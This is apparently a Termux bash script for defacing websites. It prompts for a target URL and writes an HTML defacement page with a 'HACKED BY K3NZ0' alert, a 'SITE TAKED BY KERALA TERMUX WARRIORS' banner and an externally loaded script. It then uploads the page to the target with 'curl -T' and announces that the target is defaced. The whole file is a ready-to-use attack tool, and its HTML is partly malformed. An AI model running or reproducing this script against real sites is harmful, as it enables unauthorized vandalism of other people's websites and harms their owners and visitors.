#!/data/data/com.termux/usr/bin/bash
clear
echo '[+] Author : alonebreecher'
echo '[+] Team : alonebreecher'
echo '[+] Github : https://www.github.com/alonebreecher'
echo ''
echo ''
read -p $'\e[32mWeb Target :\e[0m ' target
read -p $'\e[32Create a Username for the script :\e[0m ' user
read -p $'\e[32mpesan   :\e[0m ' message1
cd $HOME
rm index.html
cat <<LOGIN>index.html
<html>
<head>
<title>K3NZ0</title>
<font class="hk2" style="text-shadow: 1px -1px 8px;" face="tahoma">
<font color="grey">
<font size="5">
	<img srs"K3NZ0.jpg">
<script>
alert("HACKED BY K3NZ0");
</script>
</head>
<body bgcolor=black>
<script type="text/javascript" src="http://htmlfreecodes.com/codes/rain.js"></script><br><div class="error">
<font color="red" size="7" face="Chicle">SITE TAKED BY KERALA TERMUX WARRIORS
<center>
</font><br>
<img style="width:50%" src="https://avatars0.githubusercontent.com/u/56509491?s=400&v=4"></div>
<font color=green>
<br>
<b><font face="courier new" size='6'>MUTTAN NILKANDA <br><br>team KTW
<marquee behavior="scroll" direction="left" scrollamount="90" scrolldelay="40" width="100%">
<font color="green">___________________________________________________________</font></marquee>
<div style="text-shadow: 0px 0px 10px green;"><span style="color: white;"><font face="transformers"><b>TEAMS : <marquee scrollamount="5" direction="left" width="50%"><span style="color: red;"> <span style="color: red;">KENZ0 - KICHU<span style="color: red;"></b></marquee></font></div><script type="text/rocketscript">/*<![CDATA[*/new TypingText(document.getElementById("message"), 90, function(i){ var ar= new Array("_", " ", "_", " "); return "" +ar[i.length % ar.length]; });//Type out examples:TypingText.runAll();/*]]>*/</script>
<marquee behavior="scroll" direction="right" scrollamount="90" scrolldelay="40" width="100%">
<font color="green">___________________________________________________________</font></marquee>
</body>
</html>
LOGIN
curl -T /$HOME/index.html $target
echo -e "\e[1;32myour target is defaced\e[0m"
